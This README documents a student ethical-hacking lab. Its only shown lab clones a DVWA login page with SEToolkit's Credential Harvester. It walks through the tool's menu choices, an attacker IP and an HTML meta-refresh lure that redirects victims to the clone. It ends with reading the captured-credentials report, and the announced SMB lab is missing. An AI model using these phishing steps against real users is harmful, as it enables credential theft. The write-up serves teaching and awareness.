# Website Cloning & SMB Enumeration Labs

**Author:** Ivan Maafo  
**Focus:** Ethical Hacking & Defensive Awareness  
**Environment:** Controlled and Authorized Lab Setup

---

## Overview

This repository documents two hands-on cybersecurity labs designed to demonstrate how common real-world attacks work and, more importantly, why proper configuration and user awareness are critical defenses.

The labs were performed strictly in a **controlled and authorized environment** for educational purposes. No real systems or users were targeted.

### Labs Covered
1. Website Cloning and Credential Harvesting (SEToolkit)
2. SMB Enumeration and Misconfiguration Analysis (Enum4Linux & smbclient)

Each lab includes:
- Clear objectives
- Tools used
- Commands executed
- Observations and findings
- Security lessons learned

---

## Ethical Disclaimer

All techniques demonstrated in this repository were used **only in a lab environment with permission**.  
These methods must **never** be used against real systems without explicit authorization.

---

#  Lab 1: Website Cloning with SEToolkit

## Objective

To understand how attackers replicate legitimate websites to capture credentials and why phishing attacks are often successful despite their simplicity.

---

## Tools Used
- Kali Linux
- Social-Engineer Toolkit (SEToolkit)

---

## Lab Environment
- Attacker Machine: Kali Linux  
- Target Application: DVWA (Lab VM)  
- Attacker IP Address: `10.6.6.1`

---

## Step 1: Launch SEToolkit

```bash
sudo su
setoolkit
1 → Social-Engineering Attacks
2 → Website Attack Vectors
3 → Credential Harvester Attack Method
2 → Site Cloner

10.6.6.1

http://dvwa.vm


<html>
<head>
<meta http-equiv="refresh" content="0; url=http://10.6.6.1/" />
</head>
</html>

Process:

Create a new HTML file

Paste the code above

Save as ladies.html

Open the file in a browser to trigger the redirect

Credential Capture Test

Test credentials were entered to simulate a user login:

Email: ladies@gmail.com
Password: 1234

Stop the Attack

Terminate SEToolkit:

Ctrl + C


Exit cleanly:

99
99
99
99

cat /root/.set/reports/"2025-12-14 13:34:09.326665.xml"





